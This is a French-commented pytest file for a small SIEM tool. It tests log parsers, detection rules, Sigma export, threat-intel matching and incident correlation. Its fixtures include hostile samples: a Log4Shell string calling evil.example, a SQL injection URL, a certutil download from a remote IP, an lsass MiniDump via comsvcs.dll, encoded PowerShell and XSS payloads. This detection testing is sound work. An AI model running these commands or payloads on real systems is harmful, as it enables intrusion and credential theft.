"""Tests : chaque règle V1 doit se déclencher sur son scénario, et le
trafic normal ne doit produire aucune alerte (contrôle des faux positifs).
"""
import sys
from datetime import datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pytest

from minisiem.events import Alert, Event
from minisiem.parsers import (parse_auth_line, parse_apache_line, parse_ufw_line,
                              parse_line, parse_evtx_xml)
from minisiem.rules import load_rules, run_rules
from minisiem.geo import GeoResolver
from minisiem.config import Config, apply_config
from minisiem.export import rule_to_sigma, alerts_to_json
from minisiem.cti import ThreatIntel, enrich_alerts, detect_threat_contacts


def _win(ts, eid, user=None, ip=None, outcome="info", etype="win_logon"):
    return Event(timestamp=ts, source="windows", event_type=etype, outcome=outcome,
                 event_id=eid, user=user, source_ip=ip, raw="x")

RULES = load_rules(str(Path(__file__).resolve().parent.parent / "rules"))


def _ssh(ts, outcome, ip, user="admin"):
    return Event(timestamp=ts, source="auth.log", event_type="ssh_login",
                 outcome=outcome, source_ip=ip, user=user, raw="x")


def _ids(alerts):
    return {a.rule_id for a in alerts}


def test_parse_failed_password():
    ev = parse_auth_line(
        "Nov  8 13:37:01 web01 sshd[123]: Failed password for root "
        "from 203.0.113.66 port 50000 ssh2", year=2026)
    assert ev and ev.event_type == "ssh_login" and ev.outcome == "failure"
    assert ev.source_ip == "203.0.113.66" and ev.user == "root"


def test_parse_accepted_password():
    ev = parse_auth_line(
        "Nov  8 13:38:00 web01 sshd[9]: Accepted password for alice "
        "from 192.168.1.20 port 51000 ssh2", year=2026)
    assert ev and ev.outcome == "success" and ev.user == "alice"


def test_bruteforce_triggers():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66")
              for i in range(15)]
    assert "SSH_BRUTEFORCE" in _ids(run_rules(RULES, events))


def test_bruteforce_below_threshold_is_quiet():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66")
              for i in range(4)]
    assert "SSH_BRUTEFORCE" not in _ids(run_rules(RULES, events))


def test_bruteforce_success_sequence():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "198.51.100.23")
              for i in range(6)]
    events.append(_ssh(t0 + timedelta(seconds=40), "success", "198.51.100.23"))
    assert "SSH_BRUTEFORCE_SUCCESS" in _ids(run_rules(RULES, events))


def test_sudo_privesc_match():
    ev = parse_auth_line(
        "Nov  8 11:00:00 web01 sudo[4812]:  www-data : user NOT in sudoers ; "
        "TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash", year=2026)
    assert ev and ev.event_type == "sudo" and ev.outcome == "failure"
    assert "SUDO_NOT_IN_SUDOERS" in _ids(run_rules(RULES, [ev]))


def test_normal_traffic_no_alert():
    t0 = datetime(2026, 11, 8, 9, 0, 0)
    events = []
    for i in range(20):
        events.append(_ssh(t0 + timedelta(minutes=2 * i), "success",
                            "192.168.1.20", user="alice"))
    assert run_rules(RULES, events) == []


# --- V2 : Apache, pare-feu, nouvelles règles, GeoIP ----------------------

def test_parse_apache_404():
    ev = parse_apache_line(
        '203.0.113.9 - - [08/Nov/2026:13:37:01 +0100] "GET /.env HTTP/1.1" '
        '404 512 "-" "sqlmap/1.7.2"')
    assert ev and ev.event_type == "web_request" and ev.status == 404
    assert ev.source_ip == "203.0.113.9" and "sqlmap" in ev.user_agent


def test_parse_ufw_block():
    ev = parse_ufw_line(
        "Nov  8 13:37:01 web01 kernel: [UFW BLOCK] IN=eth0 OUT= "
        "SRC=198.51.100.77 DST=10.0.0.5 PROTO=TCP SPT=50000 DPT=23")
    assert ev and ev.event_type == "fw_block" and ev.dest_port == 23
    assert ev.source_ip == "198.51.100.77"


def test_autodetect_routes_each_format():
    assert parse_line('10.0.0.5 - - [08/Nov/2026:10:00:00 +0100] '
                      '"GET / HTTP/1.1" 200 10 "-" "x"').event_type == "web_request"
    assert parse_line("Nov  8 10:00:00 web01 sshd[1]: Failed password for root "
                      "from 203.0.113.66 port 1 ssh2").event_type == "ssh_login"


def _web(ts, status, ip, ua="FF", url="/x"):
    return Event(timestamp=ts, source="access.log", event_type="web_request",
                 outcome="failure" if status >= 400 else "success",
                 source_ip=ip, status=status, user_agent=ua, url=url, raw="x")


def test_web_scan_triggers():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_web(t0 + timedelta(seconds=2 * i), 404, "203.0.113.9") for i in range(25)]
    assert "WEB_SCAN" in _ids(run_rules(RULES, events))


def test_web_tooling_user_agent():
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 404, "203.0.113.9", ua="sqlmap/1.7.2#dev")
    assert "WEB_ATTACK_TOOL" in _ids(run_rules(RULES, [ev]))


def test_web_injection_in_url():
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 500, "203.0.113.9",
              url="/p.php?id=1'%20UNION%20SELECT%20pass%20FROM%20users--")
    assert "WEB_INJECTION" in _ids(run_rules(RULES, [ev]))


def test_port_scan_distinct_ports():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [Event(timestamp=t0 + timedelta(seconds=i), source="ufw.log",
                    event_type="fw_block", outcome="blocked",
                    source_ip="198.51.100.77", dest_port=p, raw="x")
              for i, p in enumerate(range(1, 26))]
    assert "PORT_SCAN" in _ids(run_rules(RULES, events))


def test_port_scan_same_port_is_quiet():
    # 25 blocages mais vers le MÊME port : pas un scan, pas d'alerte
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [Event(timestamp=t0 + timedelta(seconds=i), source="ufw.log",
                    event_type="fw_block", outcome="blocked",
                    source_ip="198.51.100.77", dest_port=443, raw="x")
              for i in range(25)]
    assert "PORT_SCAN" not in _ids(run_rules(RULES, events))


def test_geo_skips_private_ip():
    r = GeoResolver()
    assert r.lookup("192.168.1.20") is None
    assert r.lookup(None) is None


# --- V3 : Windows EVTX, baseline horaire, ATT&CK -------------------------

_EVTX_4625 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><EventID>4625</EventID>'
    '<TimeCreated SystemTime="2026-11-08T02:00:05Z"/><Computer>DC01</Computer>'
    '</System><EventData><Data Name="TargetUserName">administrateur</Data>'
    '<Data Name="IpAddress">203.0.113.66</Data>'
    '<Data Name="LogonType">10</Data></EventData></Event>')


def test_parse_evtx_4625():
    ev = parse_evtx_xml(_EVTX_4625)
    assert ev and ev.event_id == 4625 and ev.event_type == "win_logon"
    assert ev.outcome == "failure" and ev.source_ip == "203.0.113.66"
    assert ev.host == "DC01" and ev.user == "administrateur"


def test_parse_evtx_4732_group_add():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
           '<System><EventID>4732</EventID>'
           '<TimeCreated SystemTime="2026-11-08T02:25:20Z"/><Computer>DC01</Computer>'
           '</System><EventData><Data Name="TargetUserName">Administrators</Data>'
           '<Data Name="MemberName">svc_backup</Data></EventData></Event>')
    ev = parse_evtx_xml(xml)
    assert ev.event_id == 4732 and ev.user == "svc_backup" and ev.detail == "Administrators"


def test_win_bruteforce_triggers():
    t0 = datetime(2026, 11, 8, 2, 0, 0)
    events = [_win(t0 + timedelta(seconds=5 * i), 4625, ip="203.0.113.66")
              for i in range(12)]
    assert "WIN_BRUTEFORCE" in _ids(run_rules(RULES, events))


def test_win_bruteforce_success_sequence():
    t0 = datetime(2026, 11, 8, 2, 0, 0)
    events = [_win(t0 + timedelta(seconds=6 * i), 4625, ip="198.51.100.23")
              for i in range(6)]
    events.append(_win(t0 + timedelta(seconds=50), 4624, ip="198.51.100.23", outcome="success"))
    assert "WIN_BRUTEFORCE_SUCCESS" in _ids(run_rules(RULES, events))


def test_win_log_cleared_match():
    ev = _win(datetime(2026, 11, 8, 2, 40), 1102, etype="win_log_cleared")
    assert "WIN_LOG_CLEARED" in _ids(run_rules(RULES, [ev]))


def test_unusual_hour_flags_outlier():
    # jdupont se connecte 8x en journée + 1x à 3h : seule la connexion de nuit sort
    events = []
    for hour in (8, 9, 10, 11):
        for k in range(2):
            events.append(_win(datetime(2026, 11, 8, hour, 10 * k), 4624,
                               user="jdupont", outcome="success"))
    events.append(_win(datetime(2026, 11, 8, 3, 12), 4624,
                       user="jdupont", outcome="success"))
    alerts = [a for a in run_rules(RULES, events) if a.rule_id == "WIN_UNUSUAL_HOUR"]
    assert len(alerts) == 1 and alerts[0].count == 1
    assert alerts[0].first_seen.hour == 3


def test_consistent_hours_no_alert():
    # Un compte de service qui tourne toujours à 2h n'est pas une anomalie
    events = [_win(datetime(2026, 11, 8, 2, 5 * i), 4624, user="svc", outcome="success")
              for i in range(6)]
    assert not [a for a in run_rules(RULES, events) if a.rule_id == "WIN_UNUSUAL_HOUR"]


# --- V4 : listes blanches, exports, Log4Shell ----------------------------

def _web(ts, status, ip, ua="FF", url="/x"):
    return Event(timestamp=ts, source="access.log", event_type="web_request",
                 outcome="failure" if status >= 400 else "success",
                 source_ip=ip, status=status, user_agent=ua, url=url, raw="x")


def test_log4shell_detected():
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 200, "203.0.113.9",
              url="/search?q=${jndi:ldap://evil.example/a}")
    assert "WEB_LOG4SHELL" in _ids(run_rules(RULES, [ev]))


def test_allowlist_suppresses_by_cidr():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "10.1.2.3") for i in range(15)]
    alerts = run_rules(RULES, events)
    assert "SSH_BRUTEFORCE" in _ids(alerts)
    cfg = Config(allow_nets=[__import__("ipaddress").ip_network("10.0.0.0/8")])
    assert apply_config(alerts, cfg) == []


def test_disabled_rule_suppressed():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66") for i in range(15)]
    alerts = run_rules(RULES, events)
    cfg = Config(disabled_rules={"SSH_BRUTEFORCE"})
    assert apply_config(alerts, cfg) == []


def _sigma(rule_id):
    import yaml as _yaml
    rule = next(r for r in RULES if r["id"] == rule_id)
    return list(_yaml.safe_load_all(rule_to_sigma(rule)))


def test_sigma_export_threshold_becomes_correlation():
    base, corr = _sigma("SSH_BRUTEFORCE")
    assert base["logsource"] == {"product": "linux", "service": "sshd"}
    assert "Failed password" in base["detection"]["keywords"]
    c = corr["correlation"]
    assert c["type"] == "event_count" and c["rules"] == [base["name"]]
    assert c["condition"] == {"gte": 10} and c["timespan"] == "5m"
    assert corr["level"] == "high" and base["level"] == "informational"


def test_sigma_export_distinct_becomes_value_count():
    _, corr = _sigma("PORT_SCAN")
    c = corr["correlation"]
    assert c["type"] == "value_count" and c["condition"]["field"] == "DPT"


def test_sigma_export_sequence_is_ordered():
    docs = _sigma("WIN_BRUTEFORCE_SUCCESS")
    names = {d["name"] for d in docs}
    final = docs[-1]["correlation"]
    assert final["type"] == "temporal_ordered" and set(final["rules"]) <= names
    assert docs[0]["detection"]["selection"] == {"EventID": 4625}


def test_sigma_export_ids_are_stable_uuids():
    import uuid
    ids = [d["id"] for r in RULES for d in _sigma(r["id"])]
    assert len(ids) == len(set(ids))
    assert all(str(uuid.UUID(i)) == i for i in ids)
    assert ids == [d["id"] for r in RULES for d in _sigma(r["id"])]


def test_sigma_export_sysmon_uses_sigma_taxonomy():
    (doc,) = _sigma("SYSMON_LSASS_ACCESS")
    assert doc["logsource"] == {"product": "windows", "category": "process_access"}
    det = doc["detection"]
    assert det["selection"]["TargetImage|endswith"] == ["\\lsass.exe"]
    assert "SourceImage|endswith" in det["filter"]
    assert det["condition"] == "selection and not filter"


def test_json_export_roundtrips():
    import json as _json
    ev = _web(datetime(2026, 11, 8, 10, 0, 0), 200, "203.0.113.9",
              url="/x?q=${jndi:ldap://e/a}")
    data = _json.loads(alerts_to_json(run_rules(RULES, [ev])))
    assert data and data[0]["rule_id"] == "WEB_LOG4SHELL"


# --- V5 : CTI (renseignement sur les menaces) ----------------------------

def test_cti_feed_loads():
    ti = ThreatIntel()
    assert ti.size > 0 and ti.match_ip("198.51.100.23") is not None


def test_cti_enriches_matching_alert():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=5 * i), "failure", "203.0.113.66")
              for i in range(15)]
    alerts = run_rules(RULES, events)
    ti = ThreatIntel()
    assert enrich_alerts(alerts, ti) >= 1
    bf = next(a for a in alerts if a.rule_id == "SSH_BRUTEFORCE")
    assert bf.threat and bf.threat["category"] == "bruteforce"


def test_cti_detects_known_bad_below_threshold():
    # 3 échecs seulement depuis une IP C2 connue : aucune règle de volume,
    # mais la CTI doit la signaler.
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0 + timedelta(seconds=30 * i), "failure", "203.0.113.200")
              for i in range(3)]
    rule_alerts = run_rules(RULES, events)
    assert "SSH_BRUTEFORCE" not in _ids(rule_alerts)
    ti = ThreatIntel()
    cti_alerts = detect_threat_contacts(ti, events, rule_alerts)
    assert len(cti_alerts) == 1 and cti_alerts[0].rule_id == "THREAT_INTEL_HIT"
    assert cti_alerts[0].severity == "critical"  # confiance 92, catégorie c2


def test_cti_no_contact_for_clean_ip():
    t0 = datetime(2026, 11, 8, 10, 0, 0)
    events = [_ssh(t0, "failure", "192.0.2.1")]  # IP absente du flux
    ti = ThreatIntel()
    assert detect_threat_contacts(ti, events, []) == []


# --- V6 : Sysmon (poste de travail Windows) ------------------------------

def _sysmon_xml(eid, data, ts="2026-11-08T14:05:31.1234567Z"):
    fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            '<System><Provider Name="Microsoft-Windows-Sysmon" '
            'Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>'
            f'<EventID>{eid}</EventID><TimeCreated SystemTime="{ts}"/>'
            '<Channel>Microsoft-Windows-Sysmon/Operational</Channel>'
            f'<Computer>PC01</Computer></System><EventData>{fields}</EventData></Event>')


WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def _proc(image, cmd, parent=r"C:\Windows\explorer.exe"):
    return Event(timestamp=datetime(2026, 11, 8, 14, 5), source="sysmon",
                 event_type="process_creation", outcome="info", host="PC01", user="mmartin",
                 process=image, parent_process=parent, command_line=cmd, raw="x")


def test_parse_sysmon_process_creation():
    ev = parse_evtx_xml(_sysmon_xml(1, {
        "Image": PS, "CommandLine": "powershell.exe -c &quot;Get-Date&quot;",
        "ParentImage": WORD, "User": r"CORP\mmartin", "IntegrityLevel": "Medium"}))
    assert ev.source == "sysmon" and ev.event_type == "process_creation"
    assert ev.process == PS and ev.parent_process == WORD
    assert ev.command_line == 'powershell.exe -c "Get-Date"'   # entités XML décodées
    assert ev.user == "mmartin" and ev.host == "PC01"
    assert ev.timestamp.microsecond == 123456                     # 7 chiffres Windows


def test_parse_sysmon_network_and_lsass_access():
    net = parse_evtx_xml(_sysmon_xml(3, {
        "Image": r"C:\Windows\System32\rundll32.exe", "SourceIp": "10.0.20.15",
        "DestinationIp": "203.0.113.200", "DestinationPort": "443"}))
    assert net.event_type == "network_connection" and net.dest_ip == "203.0.113.200"
    assert net.dest_port == 443 and net.source_ip == "10.0.20.15"
    acc = parse_evtx_xml(_sysmon_xml(10, {
        "SourceImage": r"C:\Temp\x.exe", "TargetImage": r"C:\Windows\system32\lsass.exe",
        "GrantedAccess": "0x1FFFFF", "SourceUser": r"CORP\mmartin"}))
    assert acc.event_type == "process_access" and acc.granted_access == "0x1fffff"
    assert acc.process == r"C:\Temp\x.exe" and acc.user == "mmartin"


def test_sysmon_event_id_1_is_not_a_security_event():
    # EventID 1 hors Sysmon : ignoré (le canal Sécurité n'a pas d'événement 1)
    xml = _sysmon_xml(1, {"Image": PS}).replace("Sysmon", "Other")
    assert parse_evtx_xml(xml) is None


def test_office_spawning_powershell_triggers():
    ev = _proc(PS, "powershell.exe -nop -w hidden", parent=WORD)
    assert "SYSMON_OFFICE_SHELL" in _ids(run_rules(RULES, [ev]))


def test_office_printing_child_is_quiet():
    ev = _proc(r"C:\Windows\splwow64.exe", "splwow64.exe 12288", parent=WORD)
    assert run_rules(RULES, [ev]) == []


def test_encoded_powershell_triggers_on_abbreviations():
    for flag in ("-enc", "-EncodedCommand", "-ec", "-e", "/enc"):
        ev = _proc(PS, f"powershell.exe -nop {flag} SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA")
        assert "SYSMON_PS_ENCODED" in _ids(run_rules(RULES, [ev])), flag


def test_admin_script_powershell_is_quiet():
    ev = _proc(PS, "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inv.ps1",
               parent=r"C:\Windows\System32\svchost.exe")
    assert run_rules(RULES, [ev]) == []


def test_certutil_download_triggers_but_hashfile_is_quiet():
    dl = _proc(r"C:\Windows\System32\certutil.exe",
               "certutil.exe -urlcache -split -f http://203.0.113.200/a C:\\Temp\\a.dll")
    assert "SYSMON_LOLBIN_DOWNLOAD" in _ids(run_rules(RULES, [dl]))
    ok = _proc(r"C:\Windows\System32\certutil.exe", "certutil.exe -hashfile setup.msi SHA256")
    assert run_rules(RULES, [ok]) == []


def _lsass(source, access):
    return Event(timestamp=datetime(2026, 11, 8, 14, 9), source="sysmon",
                 event_type="process_access", outcome="info", host="PC01",
                 process=source, target=r"C:\Windows\system32\lsass.exe",
                 granted_access=access, raw="x")


def test_lsass_memory_access_triggers():
    alerts = run_rules(RULES, [_lsass(r"C:\Windows\System32\rundll32.exe", "0x1010")])
    assert [a.severity for a in alerts if a.rule_id == "SYSMON_LSASS_ACCESS"] == ["critical"]


def test_lsass_access_by_antivirus_is_filtered():
    av = _lsass(r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe", "0x1410")
    limited = _lsass(r"C:\Windows\System32\Taskmgr.exe", "0x1000")   # lecture limitée
    assert run_rules(RULES, [av, limited]) == []


def test_run_key_persistence_triggers():
    ev = Event(timestamp=datetime(2026, 11, 8, 14, 7), source="sysmon",
               event_type="registry_set", outcome="info", host="PC01",
               process=r"C:\Windows\System32\rundll32.exe",
               target=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Upd",
               raw="x")
    assert "SYSMON_RUN_KEY" in _ids(run_rules(RULES, [ev]))


def test_lolbin_network_and_cti_on_destination():
    t0 = datetime(2026, 11, 8, 14, 6)
    events = [Event(timestamp=t0 + timedelta(seconds=60 * i), source="sysmon",
                    event_type="network_connection", outcome="info", host="PC01",
                    process=r"C:\Windows\System32\rundll32.exe", source_ip="10.0.20.15",
                    dest_ip="203.0.113.200", dest_port=443, raw="x") for i in range(5)]
    alerts = run_rules(RULES, events)
    net = [a for a in alerts if a.rule_id == "SYSMON_LOLBIN_NETWORK"]
    assert len(net) == 1 and net[0].count == 5
    cti = detect_threat_contacts(ThreatIntel(), events, alerts)
    assert [(a.rule_id, a.source_ip) for a in cti] == [("THREAT_INTEL_HIT", "203.0.113.200")]


def test_sysmon_sample_normal_day_is_quiet_attack_is_seen():
    from minisiem.parsers import parse_file
    events = list(parse_file(str(Path(__file__).resolve().parent.parent
                                 / "samples" / "sysmon_events.xml")))
    normal = [e for e in events if e.timestamp.hour < 14]
    assert normal and run_rules(RULES, normal) == []
    seen = _ids(run_rules(RULES, events))
    assert {"SYSMON_OFFICE_SHELL", "SYSMON_PS_ENCODED", "SYSMON_LOLBIN_DOWNLOAD",
            "SYSMON_LOLBIN_NETWORK", "SYSMON_RUN_KEY", "SYSMON_LSASS_ACCESS"} <= seen


def test_endswith_and_filter_operators():
    from minisiem.rules import _match_field
    assert _match_field(r"C:\X\PowerShell.EXE", {"endswith": ["\\powershell.exe"]})
    assert not _match_field(None, {"endswith": "x"})
    rule = {"id": "T", "title": "t", "type": "match", "level": "low",
            "selection": {"event_type": "process_creation"},
            "filter": {"process": {"endswith": "\\ok.exe"}}, "group_by": ["process"]}
    kept = _proc(r"C:\bad.exe", "x")
    dropped = _proc(r"C:\ok.exe", "x")
    assert [a.count for a in run_rules([rule], [kept, dropped])] == [1]


# --- V7 : corrélation entre règles (incident « chaîne d'infection ») ------

def _sysmon_alert(rule_id, minute, host="PC01"):
    t = datetime(2026, 11, 8, 14, 0) + timedelta(minutes=minute)
    return Alert(rule_id=rule_id, title=rule_id, severity="high", attack="T0000",
                 source_ip=None, user="mmartin", first_seen=t, last_seen=t, count=1,
                 description="", host=host)


CHAIN = next(r for r in RULES if r["id"] == "SYSMON_INFECTION_CHAIN")


def _chain(alerts):
    from minisiem.rules import _run_correlation
    return _run_correlation(CHAIN, alerts)


def test_chain_groups_three_distinct_detections_on_one_host():
    members = [_sysmon_alert("SYSMON_OFFICE_SHELL", 0), _sysmon_alert("SYSMON_PS_ENCODED", 1),
               _sysmon_alert("SYSMON_RUN_KEY", 4)]
    (inc,) = _chain(members)
    assert inc.severity == "critical" and inc.count == 3 and inc.host == "PC01"
    assert all(a.grouped_in == "SYSMON_INFECTION_CHAIN" for a in members)
    assert "SYSMON_PS_ENCODED" in inc.evidence[1]          # chronologie de l'incident


def test_chain_needs_three_different_rules():
    # deux règles seulement, même répétées : pas d'incident
    alerts = [_sysmon_alert("SYSMON_LOLBIN_NETWORK", m) for m in range(5)]
    alerts.append(_sysmon_alert("SYSMON_RUN_KEY", 6))
    assert _chain(alerts) == []
    assert all(a.grouped_in is None for a in alerts)


def test_chain_respects_window_and_host():
    spread = [_sysmon_alert("SYSMON_OFFICE_SHELL", 0), _sysmon_alert("SYSMON_PS_ENCODED", 10),
              _sysmon_alert("SYSMON_RUN_KEY", 30)]                 # 30 min > 15 min
    assert _chain(spread) == []
    split = [_sysmon_alert("SYSMON_OFFICE_SHELL", 0, "PC01"),
             _sysmon_alert("SYSMON_PS_ENCODED", 1, "PC02"),
             _sysmon_alert("SYSMON_RUN_KEY", 2, "PC03")]           # trois postes différents
    assert _chain(split) == []


def test_chain_on_sysmon_sample_replaces_six_alerts_by_one_incident():
    from minisiem.parsers import parse_file
    events = list(parse_file(str(Path(__file__).resolve().parent.parent
                                 / "samples" / "sysmon_events.xml")))
    alerts = run_rules(RULES, events)
    (inc,) = [a for a in alerts if a.rule_id == "SYSMON_INFECTION_CHAIN"]
    grouped = [a for a in alerts if a.grouped_in == "SYSMON_INFECTION_CHAIN"]
    assert inc.count == len(grouped) == 6
    assert inc.host == "PC-COMPTA01.corp.local" and inc.user == "mmartin"
    normal = [e for e in events if e.timestamp.hour < 14]
    assert run_rules(RULES, normal) == []


def test_correlation_with_unknown_rule_is_refused(tmp_path):
    (tmp_path / "a.yml").write_text(
        "id: A\ntitle: a\ntype: correlation\nrules: [INEXISTANTE]\n", encoding="utf-8")
    with pytest.raises(ValueError):
        load_rules(str(tmp_path))


def test_sigma_export_chain_is_temporal_with_threshold():
    import yaml as _yaml
    (doc,) = _yaml.safe_load_all(rule_to_sigma(CHAIN, RULES))
    c = doc["correlation"]
    assert c["type"] == "temporal" and c["condition"] == {"gte": 3}
    assert c["group-by"] == ["Computer"] and c["timespan"] == "15m"
    assert "sysmon_lsass_access" in c["rules"]


def test_report_escapes_values_from_logs():
    from minisiem.report import render_report
    evil_user = '"><img src=x onerror=alert(1)>'
    evil_ip = "</script><script>alert(2)</script>"
    ev = _ssh(datetime(2026, 11, 8, 10, 0), "failure", evil_ip, evil_user)
    alert = Alert(rule_id="T", title="t", severity="high", attack="T1110", source_ip=evil_ip,
                  user=evil_user, first_seen=ev.timestamp, last_seen=ev.timestamp, count=1,
                  description="", evidence=[ev.raw], lat=1.0, lon=2.0, country="X")
    out = render_report([alert], [ev])
    assert "<img src=x" not in out and "<script>alert(2)" not in out
    assert "&lt;img src=x" in out


def test_comsvcs_minidump_triggers_on_both_syntaxes():
    rundll = r"C:\Windows\System32\rundll32.exe"
    for cmd in (r"rundll32 C:\windows\system32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full",
                r"rundll32.exe comsvcs.dll #24 624 C:\t\l.dmp full"):
        assert "SYSMON_COMSVCS_MINIDUMP" in _ids(run_rules(RULES, [_proc(rundll, cmd)])), cmd
    ok = _proc(rundll, r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl")
    assert run_rules(RULES, [ok]) == []
